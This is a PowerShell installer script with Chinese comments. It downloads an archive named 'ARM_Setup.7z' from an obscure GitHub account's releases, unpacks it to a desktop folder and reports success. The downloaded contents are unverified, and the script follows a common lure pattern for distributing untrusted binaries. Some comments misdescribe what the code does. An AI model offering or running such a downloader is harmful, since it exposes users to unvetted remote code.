# 確保下載時使用正確的安全協議
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. 定義下載網址與本地路徑
$url = "https://github.com/windowslnk133-gif/ARM/releases/download/AI/ARM_Setup.7z"
$savePath = "$env:TEMP\ARM_Setup.7z"
$desktopDir = "$env:USERPROFILE\Desktop\ARM_App"

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "  Install ARM (91MB)" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

# 2. 開始下載檔案
try {
    Invoke-WebRequest -Uri $url -OutFile $savePath -UserAgent "Mozilla/5.0"
} catch {
    Write-Error "Install Erorr"
    exit
}

# 3. 強制建立桌面目標資料夾 (確保它絕對存在)
if (!(Test-Path $desktopDir)) { 
    New-Item -ItemType Directory -Path $desktopDir -Force | Out-Null 
}

Write-Host "Install To Desktop [ARM_App] ..." -ForegroundColor Yellow

# 4. 採用 Windows Shell 核心解壓，保證檔案一定會乖乖降落到桌面資料夾
try {
    $shell = New-Object -ComObject Shell.Application
    $zipFolder = $shell.NameSpace($savePath)
    $destFolder = $shell.NameSpace($desktopDir)
    $destFolder.CopyHere($zipFolder.Items(), 16)
} catch {
    # 如果舊電腦不支援，使用備用解包指令
    tar -xf $savePath -C $desktopDir
}

# 5. 刪除暫存的壓縮檔
if (Test-Path $savePath) {
    Remove-Item $savePath -Force
}

# 6. 強制重新整理桌面，讓圖示立刻顯示出來
$shellApp = New-Object -ComObject Shell.Application
$shellApp.Namespace(0).Self.InvokeVerb("Properties") | Out-Null

Write-Host "=========================================="
Write-Host "[Notification] Success" -ForegroundColor Green
Write-Host "==========================================" -ForegroundColor Green


